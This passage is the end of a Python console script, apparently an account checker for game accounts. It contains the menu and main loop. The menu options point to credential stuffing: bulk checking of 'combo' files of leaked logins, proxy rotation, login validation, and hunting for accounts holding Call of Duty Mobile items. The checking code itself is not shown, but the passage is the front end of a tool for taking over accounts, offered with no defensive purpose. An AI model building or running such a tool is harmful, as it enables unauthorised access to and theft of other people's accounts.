        console.print("\n  [bold cyan]🔄 Refreshing session for next check...[/bold cyan]")
        time.sleep(1)
        clear_screen()
        display_banner()
        console.print("\n" + "═" * 71 + "\n")

def display_main_menu():
    console.print(Panel(
        "[bold white]  1[/bold white]  [dim]Bulk Check    — check combo file[/dim]\n"
        "[bold white]  2[/bold white]  [dim]Single Check  — check one account[/dim]\n"
        "[bold white]  3[/bold white]  [dim]Proxy Setup   — configure proxies[/dim]\n"
        "[bold white]  4[/bold white]  [dim]Validator     — check if valid login[/dim]\n"
        "[bold white]  5[/bold white]  [dim]Clean Hunter  — clean accounts with CODM only[/dim]",
        title=f"[bold {THEME_PRIMARY}]MENU[/]", border_style=THEME_BORDER, padding=(0, 2)
    ))
    while True:
        try:
            choice = console.input("  [bold #D4C4A8]> [/]").strip()
            if choice in ("1", "2", "3", "4", "5"):
                return choice
            console.print("  [#8C7A6B]Enter 1, 2, 3, 4, or 5.[/]")
        except KeyboardInterrupt:
            return "3"

def main():
    global proxy_manager
    prompt_proxy_setup()
    prompt_cookie_source()
    while True:
        clear_screen()
        display_banner()
        choice = display_main_menu()
        if choice == '1':
            bulk_check()
        elif choice == '2':
            single_check()
        elif choice == '3':
            clear_screen()
            display_banner()
            prompt_proxy_setup()
        elif choice == '4':
            validator_check()
        elif choice == '5':
            clean_hunter()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n[yellow]⚠️  Script terminated by user[/yellow]")
    except Exception as e:
        import traceback
        console.print(f"[red]❌ Unexpected error: {e}[/red]")
        traceback.print_exc()